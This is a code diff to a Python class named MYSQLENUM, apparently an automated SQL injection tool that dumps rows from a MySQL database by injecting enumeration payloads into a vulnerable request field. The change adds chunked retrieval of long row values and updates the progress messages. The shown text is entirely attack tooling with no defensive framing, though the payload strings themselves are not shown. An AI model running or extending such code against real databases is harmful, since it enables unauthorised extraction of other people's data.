@@ -125,7 +125,7 @@ class MYSQLENUM():
             
             row_part = self.get_partial_row_content(row, table, col, (buff*pos)+1, buff)
             
-            prog_bar.set_description("Retrieving partial row: {}".format(clr.red(row_part)))
+            prog_bar.set_description("Retrieving partial row:{}".format(clr.red(row_part)))
             
             yield row_part
         
@@ -373,17 +373,23 @@ class MYSQLENUM():
         
         for i in prog_bar:
             
-            live_enum_pl = self.sqli.replace(self.payload_delimiter,self.enum_rows_pl.format(table_name=table_name, col_name=col_name)+self.limits.replace("~num~",str(i)))
-            
-            self.data[self.vuln_field] = live_enum_pl
-            
-            row = self.send_sqli()
+            prog_bar.set_description("Enumerating row: '{}'".format(clr.red(str(i))))
             
             row_len = self.get_row_len(str(i), table_name, col_name)
-
-            row = row+" ({})".format(clr.red(row_len)) if (int(row_len) > self.buff) else row+" ({})".format(row_len)
             
-            prog_bar.set_description("Enumerated row data: '{}'".format(clr.red(row)))
+            if int(row_len) > self.buff:
+            
+                row = self.get_long_row_content(str(i), table_name, col_name)
+            
+            else:
+            
+                live_enum_pl = self.sqli.replace(self.payload_delimiter,self.enum_rows_pl.format(table_name=table_name, col_name=col_name)+self.limits.replace("~num~",str(i)))
+            
+                self.data[self.vuln_field] = live_enum_pl
+                
+                row = self.send_sqli()
+            
+            
             
             row_list.append(row)
             
